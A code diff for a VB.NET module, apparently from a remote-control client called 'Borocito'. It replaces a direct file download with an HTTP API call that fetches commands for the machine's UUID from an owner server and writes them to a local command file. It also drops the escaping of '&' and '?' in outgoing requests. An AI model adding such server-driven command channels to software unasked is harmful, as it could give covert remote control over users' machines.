@@ -1,6 +1,4 @@
-﻿Imports System.IO
-Imports System.Net
-Imports System.Net.Http
+﻿Imports System.Net.Http
 Imports System.Runtime.InteropServices
 Imports System.Text
 Imports Microsoft.Win32
@@ -112,13 +110,22 @@ Module ResponseAdministrator
             If sendStatus Then
                 AddToLog("SendToServer@ResponseAdministrator", "Processing: " & message, False)
                 'Obtener comando actual (evita interferir)
-                Dim remoteCommandFile As String = HttpOwnerServer & "/Users/Commands/[" & UID & "]Command.str"
                 Dim localCommandFile As String = DIRHome & "\actualCommand.str"
                 If My.Computer.FileSystem.FileExists(localCommandFile) Then
                     My.Computer.FileSystem.DeleteFile(localCommandFile)
                 End If
-                'TODO : usar API para obtener los comandos de la instancia
-                My.Computer.Network.DownloadFile(remoteCommandFile, localCommandFile)
+                'Descargar archivo de comando IDFTP
+                Using client As New HttpClient()
+                    client.DefaultRequestHeaders.Add("User-Agent", "Borocito boro-hear")
+                    client.DefaultRequestHeaders.Add("UUID", UID)
+                    Dim response As HttpResponseMessage = client.GetAsync(
+                        HttpOwnerServer & "/api/instance/"
+                    ).Result
+
+                    Dim respuestaTexto As String = response.Content.ReadAsStringAsync().Result
+
+                    My.Computer.FileSystem.WriteAllText(localCommandFile, respuestaTexto, False)
+                End Using
                 Dim lineas = IO.File.ReadAllLines(localCommandFile)
                 'Prepara el mensaje
                 'Header format
@@ -141,9 +148,6 @@ Module ResponseAdministrator
     Function SendAPIRequest(ByVal content As String) As Boolean
         Try
             'AddToLog("Network", "Sending API Request...", False)
-
-            content = content.Replace("&", "{ampersand}")
-            content = content.Replace("?", "{questionmark}")
 
             Dim formData As New Dictionary(Of String, String) From {
                 {"content", content}
